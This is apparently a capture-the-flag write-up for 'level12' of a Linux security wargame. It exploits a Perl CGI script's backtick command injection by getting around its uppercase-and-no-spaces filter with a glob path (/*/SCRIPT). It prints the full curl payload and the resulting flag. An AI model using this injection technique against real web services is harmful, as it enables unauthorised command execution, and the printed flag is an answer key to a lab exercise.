# level12

We see a script `./level12.pl` and nothing else. We examine it and determine it does something similar to the script found at `level04` ; it sets up a simple server, waiting for query parameters.

We're looking to exploit the following lines :

```
$xx =~ tr/a-z/A-Z/; 
$xx =~ s/\s.*//;
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

With `$xx` as our input, the first line replaces all lowercase characters with uppercase, and the second strips anything past the first space.

Our input needs to be in all caps and contain no spaces. We can't use `x=$(getflag)` like before. How can we get around that ?

We start by writing a script called `/tmp/SCRIPT` :

```
#!/bin/bash

getflag > /tmp/flag
```

`SCRIPT` being uppercase, we won't have an issue. But `tmp` isn't, so we run `/*/SCRIPT` instead. This will match any script that fits the `*`.

We run the following (with simple quotes, so our `$` isn't interpreted) :

```
curl localhost:4646?x='$(/*/SCRIPT)'
```

## The flag

The script executes, we read `/tmp/flag` and we get our flag :

```
g1qKMiRpXf53AWhDaU7FEkczr
```